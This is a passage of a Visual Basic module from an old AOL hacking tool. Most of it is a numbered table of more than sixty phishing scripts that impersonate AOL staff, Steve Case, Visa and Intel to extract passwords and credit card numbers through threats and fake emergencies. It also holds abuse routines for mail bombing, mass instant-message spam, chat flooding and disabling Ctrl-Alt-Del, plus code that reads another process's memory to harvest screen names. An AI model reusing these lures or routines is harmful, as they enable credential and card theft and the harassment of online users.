PhishPhrases = "Hello member, and our accounts say that you have either enter an incorrect age, or none at all.  This is needed to verify you are at a legal age to hold an AOL account.  We will also have to ask for your log on password to further verify this fact. Respond in next 30 seconds to keep account active, thank you."
ElseIf Phrazes = "25" Then
PhishPhrases = "Dear member, I am Greg Toranis and I werk for AOL online security. We were informed that someone with that account was trading sexually explecit material. That is completely illegal, although I presonally do not care =).  Since this is the first time this has happened, we must assume you are NOT the actual account holder, since he has never done this before. So I must request that you reply with your password and first and last name, thank you."
ElseIf Phrazes = "26" Then
PhishPhrases = "Hello, I am Steve Case.  You know me as the creator of America Online, the world's most popular online service.  I am here today because we are under the impression that you have 'HACKED' my service.  If you have, then that account has no password.  Which leads us to the conclusion that if you cannot tell us a valid password for that account you have broken an international computer privacy law and you will be traced and arrested.  Please reply with the password to avoind police action, thank you."
ElseIf Phrazes = "27" Then
PhishPhrases = "Dear AOL member.  I am Guide zZz, and I am currently employed by AOL.  Due to a new AOL rate, the $10 for 20 hours deal, we must ask that you reply with your log on password so we can verify the account and allow you the better monthly rate. Thank you."
ElseIf Phrazes = "28" Then
PhishPhrases = "Hello I am CATWatch01. I witnessed you verbally assaulting an AOL member.  The account holder has never done this, so I assume you are not him.  Please reply with your log on password as proof.  Reply in next minute to keep account active."
ElseIf Phrazes = "29" Then
PhishPhrases = "I am with AOL's Internet Snooping Department.  We watch EVERY site our AOL members visit.  You just recently visited a sexually explecit page.  According to the new TOS, we MUST imose a $10 fine for this.  I must ask you to reply with either the credit card you use to pay for AOL with, or another credit card.  If you do not, we will notify the authorities.  I am sorry."
ElseIf Phrazes = "30" Then
PhishPhrases = "Dear AOL Customer, despite our rigorous efforts in our battle against 'hackers', they have found ways around our system, logging onto unsuspecting users accounts WITHOUT thier passwords. To ensure you are the responsible, paying customer -and not a 'hacker'- we need you to click on the RESPOND button and enter your password for verification. We are very sorry for this trouble. --AOL Security/B.A.H. Team"
ElseIf Phrazes = "31" Then
PhishPhrases = "Dear member, I am a Service Representitive with the America Online Corporation,and I am sorry to inform you that we have encountered an error in our Main-Frame computer system and lost the billing information to some of our users.  Unfortunatley your account was in that group. We need you to reply back with your billing information including: Name (as appears on card), address, and C.C. Number w/EXP Date. Failure in correcting this problem will result in account termination. Thank you for your cooperation-for your assistance with this problem your account will be credited w/2 free hours of online time.  --AOL Cust. Service"
ElseIf Phrazes = "32" Then
PhishPhrases = "Good evening AOL User, our billing department is having computer trouble -the terminal containing your billing information- and we are positive that our computers have been fully restored, but to verify this information and to cause the least amount of complications as possible, we only need you to click RESPOND and enter your Credit Card number including EXP. Date...we are very sorry for any trouble.   --AOL Billing Department"
ElseIf Phrazes = "33" Then
PhishPhrases = "Hello I am with America Online New user Data base we have encounterd an error in your sign up process please respond and State your full name first and last and your personal log in password."
ElseIf Phrazes = "34" Then
PhishPhrases = "Hello I am with America Online Billing department and we have you down to get billed in 2weeks $300 dollars if you disagree please respond with your full name Creidt card number with experation date address area code city state and phone number."
ElseIf Phrazes = "35" Then
PhishPhrases = "Hello i am With America  Online billing Dep. we are missing your sign up file from our user data base please click respond and send us your full name address city state zipcode areacode phone number Creidt card with experation date and personal log on password."
ElseIf Phrazes = "36" Then
PhishPhrases = "Hello, I am an America Online Billing Representative and I am very sorry to inform you that we have accidentally deleted your billing records from our main computer.  I must ask you for your full name, address, day/night phone number, city, state, credit card number, expiration date, and the bank.  I am very sorry for the invonvenience.  Thank you for your understanding and cooperation!  Brad Kingsly, (CAT ID#13)  Vienna, VA."
ElseIf Phrazes = "37" Then
PhishPhrases = "Hello, I am a member of the America Online Security Agency (AOSA), and we have identified a scam in your billing.  We think that you may have entered a false credit card number on accident.  For us to be sure of what the problem is, you MUST respond with your password.  Thank you for your cooperation!  (REP Chris)  ID#4322."
ElseIf Phrazes = "38" Then
PhishPhrases = "Hello, I am an America Online Billing Representative. It seems that the America On-line password record was tampered with by un-authorized officials. Some, but very few passwords were changed. This slight situation occured not less then five minutes ago.I will have to ask you to click the respond button and enter your log-on password. You will be informed via E-Mail with a conformation stating that the situation has been resolved.Thank you for your cooperation. Please keep note that you will be recieving E-Mail from us at AOLBilling. And if you have any trouble concerning passwords within your account life, call our member services number at 1-800-328-4475."
ElseIf Phrazes = "39" Then
PhishPhrases = "Dear AOL member, We are sorry to inform you that your account information was accidentely deleted from our account database. This VERY unexpected error occured not less than five minutes ago.Your screen name (not account) and passwords were completely erased. Your mail will be recovered, but your billing info will be erased Because of this situation, we must ask you for your password. I realize that we aren't supposed to ask your password, but this is a worst case scenario that MUST be corrected promptly, Thank you for your cooperation."
ElseIf Phrazes = "40" Then
PhishPhrases = "AOL User: We are very sorry to inform you that a mistake was made while correcting people's account info. Your screen name was (accidentely) selected by AOL to be deleted. Your account cannot be totally deleted while you are online, so luckily, you were signed on for us to send this message.All we ask is that you click the Respond button and enter your logon password. I can also asure you that this scenario will never occur again. Thank you for your coop"
ElseIf Phrazes = "41" Then
PhishPhrases = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf Phrazes = "42" Then
PhishPhrases = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
ElseIf Phrazes = "43" Then
PhishPhrases = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf Phrazes = "44" Then
PhishPhrases = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf Phrazes = "45" Then
PhishPhrases = "Hello, how is one of our more privelaged OverHead Account Users doing today? We are sorry to report that due to hackers, Stratus is reporting problems, please respond with the last four digits of your home telephone number and Logon PW. Thanks -AOL Acc.Dept."
ElseIf Phrazes = "46" Then
PhishPhrases = "Please click on 'respond' and send me your personal logon password immediately so we may validate your account.  Failure to cooperate may result in permanent account termination.  Thank you for your cooperation and enjoy the service!"
ElseIf Phrazes = "47" Then
PhishPhrases = "Due to problems with the New Member Database of America Online, we are forced to ask you for your personal logon password online.  Please click on 'respond' and send me this information immediately or face account termination!  Thank you for your cooperation."
ElseIf Phrazes = "48" Then
PhishPhrases = "Hello current user,we had a virus in are system today around 8:30 this morning,Random memory loses followed!We are going to have to ask for your billing info that you entered in when you signed up![Credit Card number,Address,Phone number,Zip code,State]To keep your account active,in case you do not reply with the information requested your account will be shut down,If this should happen,contact us at our 800#!Thank you for your cooperation! :-)   :AOL Billing"
ElseIf Phrazes = "49" Then
PhishPhrases = "During your sign on period your Credit Card number did not cycle,please respond with the credit card number used during sign-up!To remain signed on our service,If you do not reply we will have to terminate your account,If this happens please contact our 800# at [1-800-827-6364].Thank you for your time,for your cooperation your account will be credited 10 free hours!  :-)      :AOL Billing"
ElseIf Phrazes = "50" Then
PhishPhrases = "Hello current member,This is the AOL billing department,We are going have to ask you for your credit card information you have used to make the account you are currently on!We had a bug in the system earlier and it may of caused errors in your bill,When you reply we will verify your account and send you,your current monthes total!If there should be errors,please contact us at [1-800-827-3891].Thank you for your time.          :AOL Billing"
ElseIf Phrazes = "51" Then
PhishPhrases = "Sorry to disturb you, but are records indicate the the credit card number you gave us has expired.  Please click respond and type in your cc# so that i may verify this and correct all errors!"
ElseIf Phrazes = "52" Then
PhishPhrases = "I work for Intel, I have a great new catalouge! If you would like this catalouge and a coupon for $200 off your next Intel purchase, please click on respond, and give me your address, full name, and your credit card number. Thanks! |=-)"
ElseIf Phrazes = "53" Then
PhishPhrases = "Hello, I am TOS ADVISOR and seeing that I made a mistake  we seem to have failed to recieve your logon password. Please click respond and enter your Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
ElseIf Phrazes = "54" Then
PhishPhrases = "Pardon me, I am with AOL's Staff and due to a transmission error we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond within 2 minutes too keep this account active. Thank you for your cooperation."
ElseIf Phrazes = "55" Then
PhishPhrases = "Hello, I am with America Online and due to technical problems we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
ElseIf Phrazes = "56" Then
PhishPhrases = "Dear User,     Upon sign up you have entered incorrect credit information. Your current credit card information  does not match the name and/or address.  We have rescently noticed this problem with the help of our new OTC computers.  If you would like to maintain an account on AOL, please respond with your Credit Card# with it's exp.date,and your Full name and address as appear on the card.  And in doing so you will be given 15 free hours.  Reply within 5 minutes to keep this accocunt active."
ElseIf Phrazes = "57" Then
PhishPhrases = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Tele#, Visa Card#, and Exp. Date. If this information is not received promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
ElseIf Phrazes = "58" Then
PhishPhrases = "Hello and welcome to America online.  We know that we have told you not to reveal your billing information to anyone, but due to an unexpected crash in our systems, we must ask you for the following information to verify your America online account: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. After this initial contact we will never again ask you for your password or any billing information. Thank you for your time and cooperation.  :-)"
ElseIf Phrazes = "59" Then
PhishPhrases = "Hello, I am a represenative of the AOL User Resource Dept.  Due to an error in our computers, your registration has failed authorization. To correct this problem we ask that you promptly hit the `Respond` key and reply with the following information: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. We hope that you enjoy are services here at America Online. Thank You.  For any further questions please call 1-800-827-2612. :-)"
ElseIf Phrazes = "60" Then
PhishPhrases = "Hello, I am a member of the America Online Billing Department.  We are sorry to inform you that we have experienced a Security Breach in the area of Customer Billing Information.  In order to resecure your billing information, we ask that you please respond with the following information: Name, Addres, Tele#, Credit Card#, Bank Name, Exp. Date, Screen Name, and Log-on Password. Failure to do so will result in immediate account termination. Thank you and enjoy America Online.  :-)"
ElseIf Phrazes = "61" Then
PhishPhrases = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted! "
ElseIf Phrazes = "62" Then
PhishPhrases = "Hello AOL Member , I am with the OnLine Technical Consultants(OTC).  You are not fully registered as an AOL memberand you are going OnLine ILLEGALLY. Please respond to this IM with your Credit Card Number , your full name , the experation date on your Credit Card and the Bank.  Please respond immediatly so that the OTC can fix your problem! Thank you and have a nice day!  : )"
ElseIf Phrazes = "63" Then
PhishPhrases = "Hello AOL Memeber.  I am sorry to inform you that a hacker broke into our system and deleted all of our files.  Please respond to this IM with you log-on password password so that we can verify billing , thank you and have a nice day! : )"
ElseIf Phrazes = "64" Then
PhishPhrases = "Hello User.  I am with the AOL Billing Department.  This morning their was a glitch in our phone lines.  When you signed on it did not record your login , so please respond to this IM with your log-on password so that we can verify billing , thank you and have a nice day! : )"
ElseIf Phrazes = "65" Then
PhishPhrases = "Dear AOL Member.  There has been hackers using your account.  Please respond to this IM with your log-on password so that we can verify that you are not the hacker.  Respond immedialtly or YOU will be considered the hacker and YOU wil be prosecuted! Thank you and have a nice day.  : )"
ElseIf Phrazes = "66" Then
PhishPhrases = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted!"
ElseIf Phrazes = "67" Then
PhishPhrases = "AOL Member , I am sorry to bother you but your account information has been deleted by hackers.  AOL has searched every bank but has found no record of you.  Please respond to this IM with your log-on password , Credit Card Number , Experation Date , you Full Name , and the Bank.  Please respond immediatly so that we can get this fixed.  Thank you and have a nice day.   :)"
ElseIf Phrazes = "68" Then
PhishPhrases = "Dear Member , I am sorry to inform you that you have 5 TOS Violation Reports..the maximum you can have is five.  Please respond to this IM with your log-on password , your Credit Card Number , your Full Name , the Experation Date , and the Bank.  If you do not respond within 2 minutes than your account will be TERMINATED!! Thank you and have a nice day.  : )"
ElseIf Phrazes = "69" Then
PhishPhrases = "Hello,Im with OTC(Online Technical Consultants).Im here to inform you that your AOL account is showing a billing error of $453.26.To correct this problem we need you to respond with your online password.If you do not comply,you will be forced to pay this bill under federal law. "
ElseIf Phrazes = "70" Then
PhishPhrases = "Hello,Im here to inform you that you just won a online contest which consisted of a $3000 dollar prize.We seem to have lost all of your account info.So in order to receive your prize you need to respond with your log on password so we can rush your prize straight to you!  Thank you."
ElseIf Phrazes = "71" Then
PhishPhrases = "Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation."
ElseIf Phrazes = "72" Then
PhishPhrases = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again.  Thank you.  :-)"
ElseIf Phrazes = "73" Then
PhishPhrases = "Attention:The message at the bottom of the screen is void when speaking to AOL employess.We are very sorry to inform you that due to a legal conflict, the Sprint network(which is the network AOL uses to connect it users) is witholding the transfer of the log-in password at sign-on.To correct this problem,We need you to click on RESPOND and enter your password, so we can update your personal Master-File,containing all of your personal info.  We are very sorry for this inconvience --AOL Customer Service Dept."
ElseIf Phrazes = "74" Then
PhishPhrases = "Hello, I am with the America Online Password Verification Commity. Due to many members incorrectly typing thier passwords at first logon sequence I must ask you to retype your password for a third and final verification. No AOL staff will ask you for your password after this process. Please respond within 2 minutes to keep this account active."
ElseIf Phrazes = "75" Then
PhishPhrases = "Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation "
ElseIf Phrazes = "76" Then
PhishPhrases = "Please disregard the message in red. Unfortunately, a hacker broke into the main AOL computer and managed to destroy our password verification logon routine and user database, this means that anyone could log onto your account without any password validation. The red message was added to fool users and make it difficult for AOL to restore your account information. To avoid canceling your account, will require you to respond with your password. After this, no AOL employee will ask you for your password again."
ElseIf Phrazes = "77" Then
PhishPhrases = "Dear America Online user, due to the recent America Online crash, your password has been lost from the main computer systems'.  To fix this error, we need you to click RESPOND and respond with your current password.  Please respond within 2 minutes to keep active.  We are sorry for this inconvinience, this is a ONE time emergency.  Thank you and continue to enjoy America Online!"
ElseIf Phrazes = "78" Then
PhishPhrases = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation. "
ElseIf Phrazes = "79" Then
PhishPhrases = "Dear User, I am sorry to report that your account has been traced and has shown that you are signed on from another location.  To make sure that this is you please enter your sign on password so we can verify that this is you.  Thank You! AOL."
ElseIf Phrazes = "80" Then
PhishPhrases = "Hello, I am sorry to inturrupt but I am from the America Online Service Departement. We have been having major problems with your account information. Now we understand that you have been instructed not to give out and information, well were sorry to say but in this case you must or your account will be terminated. We need your full name as well as last, Adress, Credit Card number as well as experation date as well as logon password. We our really sorry for this inconveniance and grant you 10 free hours. Thank you and enjoy AOL."
ElseIf Phrazes = "81" Then
PhishPhrases = "Hello, My name is Dan Weltch from America Online. We have been having extreme difficulties with your records. Please give us your full log-on Scree Name(s) as well as the log-on PW(s), thank you :-)"
ElseIf Phrazes = "82" Then
PhishPhrases = "Hello, I am the TOSAdvisor. I am on a different account because there has been hackers invading our system and taking over our accounts. If you could please give us your full log on PW so we can correct this problem, thank you and enjoy AOL. "
ElseIf Phrazes = "83" Then
PhishPhrases = "Hello, I am from the America Online Credit Card Records and we have been experiancing a major problem with your CC# information. For us to fix this we need your full log-on screen names(s) and password(s), thank. "
ElseIf Phrazes = "84" Then
PhishPhrases = "Hi, I'm with Anti-Hacker Dept of AOL. Due to Thë break-in's into our system, we have experienced problems. We need you to respond with your credit card #, exp date, full name, address, and phone # to correct errors. "
ElseIf Phrazes = "85" Then
PhishPhrases = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
End If
End Function

Public Sub Playwav(File As String)
    Dim SafeFile As String
    SafeFile$ = Dir(File$)
    If SafeFile$ <> "" Then
        Call sndPlaySound(File$, SND_FLAG)
    End If
End Sub
Public Sub PlayMIDI(MIDIFile As String)
    Dim SafeFile As String
    SafeFile$ = Dir(MIDIFile$)
    If SafeFile$ <> "" Then
        Call mciSendString("play " & MIDIFile$, 0&, 0, 0)
    End If
End Sub

Public Sub Mail_Bomb(Who As String, subject As String, Message As String)
Do
DoEvents
Call Mail_Send(Who$, subject$, Message$)
TimeOut 0.3
Loop
End Sub



Public Sub Clipboard_Copy(What As TextBox)
Clipboard.SetText What
End Sub
Public Function Clipboard_Paste() As String
Clipboard_Paste = Clipboard.GetText
End Function

Public Sub Form_Drag(Form1 As Form)
Call ReleaseCapture
Call SendMessage(Form1.hwnd, WM_SYSCOMMAND, WM_MOVE, 0)
End Sub


Public Sub SetGreetorPrefs()
    Dim AOL As Long, Tool As Long, Toolbar As Long
    Dim ToolIcon As Long, DoThis As Long, sMod As Long
    Dim MDI As Long, mPrefs As Long, mButton As Long
    Dim gStatic As Long, mStatic As Long, fStatic As Long
    Dim maStatic As Long, dMod As Long, ConfirmCheck As Long
    Dim CloseCheck As Long, SpellCheck As Long, OKButton As Long, Number As Integer
    Dim CurPos As POINTAPI, WinVis As Long
    DoEvents
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    Tool& = FindWindowEx(AOL&, 0&, "AOL Toolbar", vbNullString)
    Toolbar& = FindWindowEx(Tool&, 0&, "_AOL_Toolbar", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, 0&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    ToolIcon& = FindWindowEx(Toolbar&, ToolIcon&, "_AOL_Icon", vbNullString)
    Call GetCursorPos(CurPos)
    Call SetCursorPos(Screen.Width, Screen.Height)
    Call PostMessage(ToolIcon&, WM_LBUTTONDOWN, 0&, 0&)
    Call PostMessage(ToolIcon&, WM_LBUTTONUP, 0&, 0&)
    Do
    DoEvents
        sMod& = FindWindow("#32768", vbNullString)
        WinVis& = IsWindowVisible(sMod&)
    Loop Until WinVis& = 1
    Number = 3
    If AOL_Version = "5" Then Number = 2
    For DoThis& = 1 To Number
        Call PostMessage(sMod&, WM_KEYDOWN, VK_DOWN, 0&)
        Call PostMessage(sMod&, WM_KEYUP, VK_DOWN, 0&)
    Next DoThis&
    Call PostMessage(sMod&, WM_KEYDOWN, VK_RETURN, 0&)
    Call PostMessage(sMod&, WM_KEYUP, VK_RETURN, 0&)
    Call SetCursorPos(CurPos.X, CurPos.Y)
    Do
        DoEvents
        mPrefs& = FindWindowEx(MDI&, 0&, "AOL Child", "Preferences")
        gStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "General")
        mStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Mail")
        fStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Font")
        maStatic& = FindWindowEx(mPrefs&, 0&, "_AOL_Static", "Marketing")
    Loop Until mPrefs& <> 0& And gStatic& <> 0& And mStatic& <> 0& And fStatic& <> 0& And maStatic& <> 0&
    mButton& = FindWindowEx(mPrefs&, 0&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    mButton& = FindWindowEx(mPrefs&, mButton&, "_AOL_Icon", vbNullString)
    Do
        DoEvents
        Call SendMessage(mButton&, WM_LBUTTONDOWN, 0&, 0&)
        Call SendMessage(mButton&, WM_LBUTTONUP, 0&, 0&)
        dMod& = FindWindow("_AOL_Modal", "Chat Preferences")
        TimeOut 0.5
    Loop Until dMod& <> 0&
    DoEvents
    ConfirmCheck& = FindWindowEx(dMod&, 0&, "_AOL_Checkbox", vbNullString)
    CloseCheck& = FindWindowEx(dMod&, ConfirmCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, CloseCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    SpellCheck& = FindWindowEx(dMod&, SpellCheck&, "_AOL_Checkbox", vbNullString)
    OKButton& = FindWindowEx(dMod&, 0&, "_AOL_icon", vbNullString)
    Call SendMessage(ConfirmCheck&, BM_SETCHECK, True, vbNullString)
    Call SendMessage(CloseCheck&, BM_SETCHECK, False, vbNullString)
    Call SendMessage(SpellCheck&, BM_SETCHECK, False, vbNullString)
    Call SendMessage(OKButton&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(OKButton&, WM_LBUTTONUP, 0&, 0&)
    DoEvents
    Call PostMessage(mPrefs&, WM_CLOSE, 0&, 0&)
End Sub

Public Sub Hidden_Sounds(PreHead As String, Sound As String)
' Sound = the chat room sound.  Like {S im, {S gotmail, {S ygp, etc...
'ciraz{s applic~1\microsoft\welcome\welcom98
SendChat PreHead + "<font color=#FFFFFE>" + Sound + "<font color=#000000>"
End Sub

Public Sub IM_Mass(List1 As ListBox, Message As String)
Dim i As Integer
For i = 0 To List1.ListCount - 1
Call IM_Send(List1.list(i), Message)
TimeOut 0.15
Next i
End Sub

Public Sub IM_Off()
 Call IM_Send("$IM_OFF", "HackBaZ")
End Sub

Public Sub IM_On()
 Call IM_Send("$IM_ON", "HackBaZ")
End Sub

Public Function LinkSend(Pre As String, Site As String, KW As String) As String
LinkSend = "</a>" & Pre$ & " < a href=" & Chr$(34) & Site$ & Chr$(34) & ">" & KW & "</A>"
End Function

Public Sub Room_Name()
SendChat "*** You are in " & Chr$(34) & Chat_RoomName & Chr$(34) & ". ***"
End Sub

Public Sub RoomBust(Room As String)
Do
DoEvents
Call Keyword("aol://2719:2-2-" & Room$)
TimeOut 0.001
Call Wait_ClickOK
TimeOut 0.1
Loop Until FindChatRoom& <> 0
TimeOut 0.1
SendChat "(((`v^÷•¤(( haçkBaZ32 Room Bust"
TimeOut 0.01
SendChat "(((`v^÷•¤(( Busted in room •" & Room$ & "•"
End Sub

Public Sub Scroll(Text As String)
Dim i As Integer
Do
DoEvents
For i = 1 To 4
Call SendChat(Text + String(116 - Len(Text), Chr(9)) + Text)
TimeOut 0.1
Next i
TimeOut 3
Loop
End Sub

Public Sub Scroll_Macro(Text As TextBox)
Dim Counter As Integer
If Mid(Text, Len(Text), 1) <> Chr$(10) Then
    Text = Text + Chr$(13) + Chr$(10)
End If
Do While (InStr(Text, Chr$(13)) <> 0)
    Counter = Counter + 1
    SendChat Mid(Text, 1, InStr(Text, Chr(13)) - 1)
    If Counter = 4 Then
        TimeOut (0.4)
        Counter = 0
    End If
    Text = Mid(Text, InStr(Text, Chr(13) + Chr(10)) + 2)
Loop
End Sub


Public Function RoomCount() As Integer
    Dim AOL As Long, MDI As Long, list As Long
    Dim Count As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    list = FindWindowEx(FindChatRoom, 0&, "_AOL_Listbox", vbNullString)
    Count& = SendMessage(list, LB_GETCOUNT, 0&, 0&)
    RoomCount = Count&
End Function
Public Sub SendChat(What As String)
    Dim Room As Long, AORich As Long, AORich2 As Long, Button As Long
    DoEvents
    Room& = FindChatRoom()
    AORich& = FindWindowEx(Room, 0&, "RICHCNTL", vbNullString)
    AORich2& = FindWindowEx(Room, AORich, "RICHCNTL", vbNullString)
    Call SendMessageByString(AORich2, WM_CHAR, ENTER_KEY, 0&)
    Call SendMessageByString(AORich2, WM_SETTEXT, 0&, What$)
    Do
    DoEvents
    Call SendMessageByString(AORich2, WM_CHAR, ENTER_KEY, 0&)
    Loop Until GetText(AORich2&) = ""
End Sub
Public Sub Disable_Ctrl_Alt_Del()
 Dim ret As Integer
 Dim pOld As Boolean
 ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, True, pOld, 0)
End Sub
Public Sub Enable_Ctrl_Alt_Del()
 Dim ret As Integer
 Dim pOld As Boolean
 ret = SystemParametersInfo(SPI_SCREENSAVERRUNNING, False, pOld, 0)
End Sub

Public Sub CenterForm(Frm As Form)
Frm.Top = (Screen.Height * 0.85) / 2 - Frm.Height / 2
Frm.Left = Screen.Width / 2 - Frm.Width / 2
End Sub
Public Sub PercentBar(Ob As Control, ByVal Percent)
Dim Num As String
If Not Ob.AutoRedraw Then
    Ob.AutoRedraw = -1
    End If
    Ob.Cls
    Ob.ScaleWidth = 100
    Ob.DrawMode = 10
    Num$ = Format$(Percent, "###") + "%"
    Ob.CurrentX = 50 - Ob.TextWidth(Num$) / 2
    Ob.CurrentY = (Ob.ScaleHeight - Ob.TextHeight(Num$)) / 2
    Ob.Print Num$
    Ob.Line (0, 0)-(Percent, Ob.ScaleHeight), , BF
    Ob.Refresh
End Sub
Public Sub AddBuddiesToList(List1 As ListBox)
On Error Resume Next
Dim AOL As Long, MDI As Long, Chi As Long, Icon As Long, cProcess As Long
Dim sThread As Long, mThread As Long, ScreenName As String, psnHold As Long
Dim rBytes As Long, LB As Long, itmHold As Long, AOLList As Long
Dim index As Integer, Combo As Long, Edit As Long
Call Keyword("buddy")
TimeOut 1
AOL = FindWindow("AOL Frame25", vbNullString)
MDI = FindWindowEx(AOL, 0&, "MDICLIENT", vbNullString)
Chi = FindWindowEx(MDI, 0&, "AOL Child", vbNullString)
AOLList = FindWindowEx(Chi, 0&, "_AOL_Listbox", vbNullString)
Combo = FindWindowEx(Chi, 0&, "_AOL_Combobox", vbNullString)
Edit = FindWindowEx(Chi, 0&, "_AOL_Edit", vbNullString)
Icon = FindWindowEx(Chi, 0&, "_AOL_Icon", vbNullString)
Icon = FindWindowEx(Chi, Icon, "_AOL_Icon", vbNullString)
 Do
  DoEvents
  TimeOut 0.1
 Loop Until Chi <> 0
TimeOut 0.15
    Call SendMessage(Icon&, WM_LBUTTONDOWN, 0&, 0&)
    Call SendMessage(Icon&, WM_LBUTTONUP, 0&, 0&)
TimeOut 1
Do
DoEvents
TimeOut 0.15
Loop Until AOLList <> 0 And Combo <> 0 And Edit <> 0
TimeOut 0.25
'add
Call SetFocusAPI(AOLList)
sThread& = GetWindowThreadProcessId(AOLList&, cProcess&)
    mThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, cProcess&)
    If mThread& Then
        For index = 0 To SendMessage(AOLList&, LB_GETCOUNT, 0, 0) - 1
            ScreenName = String$(4, vbNullChar)
            itmHold& = SendMessage(AOLList&, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
            itmHold& = itmHold& + 24
            Call ReadProcessMemory(mThread&, itmHold&, ScreenName, 4, rBytes)
            Call CopyMemory(psnHold&, ByVal ScreenName, 4)
            psnHold& = psnHold& + 6
            ScreenName = String$(16, vbNullChar)
            Call ReadProcessMemory(mThread&, psnHold&, ScreenName, Len(ScreenName), rBytes&)
            ScreenName = Left$(ScreenName, InStr(ScreenName, vbNullChar) - 1)
            List1.AddItem ScreenName
        Next index
        Call CloseHandle(mThread)
    End If
Call Window_Close(Chi)
End Sub
Public Sub ClickAOLIcon(Icon As Long)
Call SendMessage(Icon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(Icon&, WM_LBUTTONUP, 0&, 0&)
End Sub

Public Function FindChatRoom() As Long
    Dim AOL As Long, MDI As Long, Child As Long
    Dim Rich As Long, AOLList As Long
    Dim AOLIcon As Long, AOLStatic As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    Rich& = FindWindowEx(Child&, 0&, "RICHCNTL", vbNullString)
    AOLList& = FindWindowEx(Child&, 0&, "_AOL_Listbox", vbNullString)
    AOLIcon& = FindWindowEx(Child&, 0&, "_AOL_Icon", vbNullString)
    AOLStatic& = FindWindowEx(Child&, 0&, "_AOL_Static", vbNullString)
